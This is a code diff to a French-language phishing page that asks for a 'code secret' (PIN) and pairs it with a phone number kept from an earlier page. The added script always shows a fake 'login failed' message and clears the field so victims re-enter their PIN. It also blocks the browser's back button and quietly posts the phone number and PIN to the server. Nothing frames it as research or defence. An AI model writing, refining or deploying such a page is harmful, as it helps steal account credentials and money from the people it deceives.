@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PIN</title>
+<title>Code secret</title>
 
 <style>
 body{
@@ -38,23 +38,67 @@ button{
     border-radius:12px;
     color:#fff;
     font-size:18px;
+    cursor:pointer;
+}
+.error{
+    color:#d93025;
+    font-size:16px;
+    margin-top:15px;
+    display:none;
 }
 </style>
 </head>
 
 <body>
 <div class="container">
-    <form action="/" method="POST" onsubmit="inject()">
-        <input type="hidden" name="phone" id="p">
-        <input type="password" name="pin" placeholder="Code secret" required>
-        <button>Envoyer</button>
-    </form>
+    <h2>Entrez votre code secret</h2>
+
+    <input type="password" id="pin" placeholder="Code secret" required>
+
+    <button onclick="send()">Continuer</button>
+
+    <div class="error" id="errorMsg">Échec de connexion</div>
 </div>
 
 <script>
-function inject(){
-    document.getElementById("p").value = sessionStorage.getItem("phone");
+/* 🔒 BLOQUE LE RETOUR ARRIÈRE */
+history.pushState(null, null, location.href);
+window.onpopstate = function () {
+    history.pushState(null, null, location.href);
+};
+
+function send(){
+    const pinInput = document.getElementById("pin"); // ajouté pour vider le champ
+    const pin = pinInput.value;
+    const phone = sessionStorage.getItem("phone");
+    const errorMsg = document.getElementById("errorMsg");
+
+    if(!pin || !phone) return;
+
+    // Affiche échec
+    errorMsg.style.display = "block";
+
+    // Vide le champ PIN après tentative ✅
+    pinInput.value = "";
+
+    // Disparaît après 3 secondes
+    setTimeout(() => {
+        errorMsg.style.display = "none";
+    }, 3000);
+
+    // Envoi serveur (inchangé)
+    fetch("/", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            phone: phone,
+            pin: pin
+        })
+    });
 }
 </script>
+
 </body>
 </html>
